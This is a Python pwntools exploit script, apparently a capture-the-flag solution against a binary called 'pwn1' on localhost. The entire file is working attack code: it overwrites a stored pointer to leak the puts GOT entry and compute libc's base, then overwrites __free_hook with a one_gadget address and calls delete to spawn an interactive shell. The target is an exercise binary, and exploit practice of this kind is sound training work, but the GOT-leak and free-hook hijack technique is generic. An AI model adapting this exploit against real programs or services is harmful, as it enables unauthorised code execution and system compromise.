#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./pwn1")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./pwn1")
    libc = elf.libc
    one_gadget = 0x3f2d6
    one_gadget = 0x3f32a

else:
    io = remote("localhost", 9999)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    one_gadget = 0x3f2d6
    one_gadget = 0x3f32a

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(pidof(io[0]))).readlines()[1], 16)
        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c\n"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def buy(name, desc, num):
    io.sendlineafter(">> ", "1")
    io.sendafter(" :\n", name)
    io.sendafter(":\n", desc)
    io.sendlineafter("?\n", str(num))

def show():
    io.sendlineafter(">> ", "2")

def edit(idx, name, cnt, desc = "", yes = 'n'):
    io.sendlineafter(">> ", "3")
    io.sendlineafter("?\n", str(idx))
    io.sendafter(" :\n", name)
    if yes == 'n':
        io.sendlineafter(")\n", "n")
        io.sendlineafter("?\n", str(cnt))
    else:
        io.sendlineafter(")\n", "y")
        io.sendafter(":\n", desc)
        io.sendlineafter("?\n", str(cnt))

def delete(idx):
    io.sendlineafter(">> ", "4")
    io.sendlineafter("?\n", str(idx))

if __name__ == "__main__":
    buy('00000000', '00000000', 0)
    edit(0, '0' * 72 + p64(elf.got['puts']), 0)
    #  DEBUG()
    show()
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - libc.sym['puts']
    success("libc.address", libc.address)
    freeHook = libc.sym['__free_hook']
    success("freeHook", freeHook)
    pause()

    #  DEBUG([0x400B84])
    edit(0, '0' * 72 + p64(freeHook), 0, p64(libc.address + one_gadget), 'y')
    #  DEBUG([0x400D77])
    delete(0)
    
    io.interactive()
    io.close()
